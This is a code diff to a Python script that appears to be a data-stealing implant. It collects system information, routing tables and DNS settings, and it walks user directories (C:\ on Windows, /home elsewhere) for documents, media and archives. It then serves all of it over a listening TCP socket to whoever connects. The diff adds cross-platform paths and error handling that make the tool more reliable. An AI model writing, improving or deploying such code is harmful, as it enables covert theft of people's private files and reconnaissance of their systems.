@@ -99,13 +99,18 @@ routingTable = rtCommand.stdout
 dns = dnsCommand.stdout
 
 #Searching files 
-path = r"/home"
+if systemInfo['platformInfo']['platform'] == 'Windows':
+	path = "C:\\"
+	separator = "\\"
+else:
+	path = r"/home"
+	separator = r'/'
 filesToSend = [{}]
 for root, dirs, files in os.walk(path):
 	for x in files:
 		if (x.endswith(('.txt','.doc','.docx','.mp4','.pdf','.mp3','.rtf','.jpg','.jpeg','.gif','.mkv','.zip','.rar','.7z','.tar','.ppt','.pptx','.xsl','.xlsx','.ods','.odt'))):
 			filesProperties = {}
-			filesProperties['path'] = root + "/" + x
+			filesProperties['path'] = root + separator + x
 			filesProperties['filename'] = x
 			filesToSend.append(filesProperties)
 filesToSend.pop(0)			
@@ -117,29 +122,34 @@ serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serverSocket.bind(('', serverPort))
 serverSocket.listen(1)
 
-
 #Sending information obtained
 while True:
-	connectionSocket,addr = serverSocket.accept()
-	connectionSocket.send(json.dumps(systemInfo, indent = 4).encode())
-	connectionSocket.recv(128)
-	connectionSocket.send(routingTable)
-	connectionSocket.recv(128)
-	connectionSocket.send(dns)
-	connectionSocket.recv(128)
+	try:
+		connectionSocket,addr = serverSocket.accept()
+		connectionSocket.send(json.dumps(systemInfo, indent = 4).encode())
+		connectionSocket.recv(128)
+		connectionSocket.send(routingTable)
+		connectionSocket.recv(128)
+		connectionSocket.send(dns)
+		connectionSocket.recv(128)
+	except:
+		print("Error when sending information")
 	
 #Sending obtained files 
-	connectionSocket.send(str(numFiles).encode())
-	connectionSocket.recv(128)
-	for i in range(numFiles):
-		with open (filesToSend[i]['path'],"rb") as f:
-			fileSize = os.path.getsize(filesToSend[i]['path'])
-			connectionSocket.send(filesToSend[i]['filename'].encode())
-			connectionSocket.recv(128)
-			connectionSocket.send(str(fileSize).encode())
-			connectionSocket.recv(128)
-			data = f.read()
-			connectionSocket.sendall(data)
-			connectionSocket.send(b"<TMB>") 
-			connectionSocket.recv(128)
-	connectionSocket.close()
+	try:
+		connectionSocket.send(str(numFiles).encode())
+		connectionSocket.recv(128)
+		for i in range(numFiles):
+			with open (filesToSend[i]['path'],"rb") as f:
+				fileSize = os.path.getsize(filesToSend[i]['path'])
+				connectionSocket.send(filesToSend[i]['filename'].encode())
+				connectionSocket.recv(128)
+				connectionSocket.send(str(fileSize).encode())
+				connectionSocket.recv(128)
+				data = f.read()
+				connectionSocket.sendall(data)
+				connectionSocket.send(b"<TMB>") 
+				connectionSocket.recv(128)
+		connectionSocket.close()
+	except: 
+		print("Error when sending files") 
